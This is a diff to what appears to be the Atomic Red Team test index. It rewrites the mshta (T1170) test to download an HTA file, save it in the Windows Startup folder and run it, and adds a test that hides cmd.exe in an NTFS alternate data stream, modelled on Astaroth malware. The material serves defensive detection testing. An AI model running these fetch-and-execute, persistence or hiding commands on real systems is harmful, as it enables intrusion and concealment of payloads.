@@ -10073,11 +10073,17 @@ defense-evasion:
           description: URL to HTA file for execution
           type: string
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta
+        temp_file:
+          description: temp_file location for hta
+          type: string
+          default: "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1170.hta"
       executor:
-        name: command_prompt
-        command: 'mshta #{hta_url}
-
-'
+        name: powershell
+        command: |
+          $var =Invoke-WebRequest "#{hta_url}"
+          $var.content|out-file "#{temp_file}"
+          mshta "#{temp_file}"
+        cleanup_command: "remove-item \"#{temp_file}\" \n"
   T1096:
     technique:
       x_mitre_data_sources:
@@ -10188,6 +10194,40 @@ defense-evasion:
           regedit /E #{path}\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
           expand \\webdav\folder\file.bat #{path}\file.txt:file.bat
           esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o
+    - name: Store file in Alternate Data Stream (ADS)
+      description: 'Storing files in Alternate Data Stream (ADS) similar to Astaroth
+        malware.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        payload_path:
+          description: Path of file to hide in ADS
+          type: path
+          default: c:\windows\system32\cmd.exe
+        ads_file_path:
+          description: Path of file to create an ADS under
+          type: path
+          default: C:\Users\Public\Libraries\yanki\desktop.ini
+        ads_name:
+          description: Name of ADS
+          type: string
+          default: ADSName
+      executor:
+        name: powershell
+        elevation_required: false
+        prereq_command: |
+          if (!(Test-Path "#{ads_file_path}"))
+          {
+            $FileCreated = New-Item -Path "#{ads_file_path}" -Type "file" -Force
+            0
+          }
+          else {0}
+        command: 'Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,#{payload_path},>,`"#{ads_file_path}:#{ads_name}`""
+
+'
+        cleanup_command: Remove-Item -Path "#{ads_file_path}" -Stream "#{ads_name}"
   T1126:
     technique:
       x_mitre_data_sources:
@@ -22181,11 +22221,17 @@ execution:
           description: URL to HTA file for execution
           type: string
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta
+        temp_file:
+          description: temp_file location for hta
+          type: string
+          default: "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1170.hta"
       executor:
-        name: command_prompt
-        command: 'mshta #{hta_url}
-
-'
+        name: powershell
+        command: |
+          $var =Invoke-WebRequest "#{hta_url}"
+          $var.content|out-file "#{temp_file}"
+          mshta "#{temp_file}"
+        cleanup_command: "remove-item \"#{temp_file}\" \n"
   T1086:
     technique:
       x_mitre_permissions_required:
